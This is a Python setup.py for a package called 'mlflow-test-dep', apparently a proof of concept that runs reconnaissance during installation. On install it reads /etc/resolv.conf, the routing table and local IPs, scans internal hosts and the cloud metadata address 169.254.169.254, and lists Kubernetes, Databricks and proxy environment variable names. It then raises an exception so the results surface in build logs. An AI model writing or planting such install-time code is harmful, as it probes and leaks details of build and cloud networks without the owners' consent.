import os
import sys
import platform
import socket
import subprocess
from setuptools import setup

proof = "🚨🚨🚨 INTERNAL_NETWORK_RECON 🚨🚨🚨\n"
proof += f"Hostname: {socket.gethostname()}\n\n"

# 1. Read DNS resolver config (already known, but re-confirm)
try:
    with open("/etc/resolv.conf", "r") as f:
        resolv = f.read()[:300]
    proof += f"=== /etc/resolv.conf ===\n{resolv}\n"
except Exception as e:
    proof += f"resolv.conf error: {type(e).__name__}\n"

# 2. Read routing table (safe, no modification)
try:
    route = subprocess.check_output(["ip", "route"], text=True, timeout=3)
    proof += f"=== ip route ===\n{route[:500]}\n"
except Exception as e:
    proof += f"ip route error: {type(e).__name__}\n"

# 3. Get local IP / interface info
try:
    hostname_ip = subprocess.check_output(["hostname", "-I"], text=True, timeout=3)
    proof += f"=== Local IPs ===\n{hostname_ip[:200]}\n"
except Exception as e:
    proof += f"hostname -I error: {type(e).__name__}\n"

# 4. Scan a small, fixed list of internal hosts/ports (SAFE: TCP handshake only, 1s timeout)
targets = [
    ("192.168.200.6", 53),    # DNS resolver
    ("192.168.200.6", 443),
    ("192.168.200.6", 8080),
    ("192.168.200.1", 443),   # Likely gateway
    ("169.254.169.254", 80),  # Metadata (confirm block)
    ("10.0.0.1", 443),        # Common VPC gateway
]
proof += "\n=== Port scan (TCP connect, no payload) ===\n"
for host, port in targets:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        result = sock.connect_ex((host, port))
        state = "OPEN" if result == 0 else f"closed(errno={result})"
        proof += f"{host}:{port} -> {state}\n"
        sock.close()
    except Exception as e:
        proof += f"{host}:{port} -> error: {type(e).__name__}\n"

# 5. Check if Kubernetes env vars leak service endpoints
proof += "\n=== K8s/Service env vars (names only, no values) ===\n"
for k in sorted(os.environ.keys()):
    if any(x in k.upper() for x in ["KUBE", "K8S", "SERVICE", "BUILD", "DATABRICKS", "PROXY"]):
        proof += f"  {k}\n"

proof += "\n🚨🚨🚨 END RECON 🚨🚨🚨\n"
print(proof)
raise Exception(proof)

setup(name="mlflow-test-dep", version="0.1", description="Internal network recon")
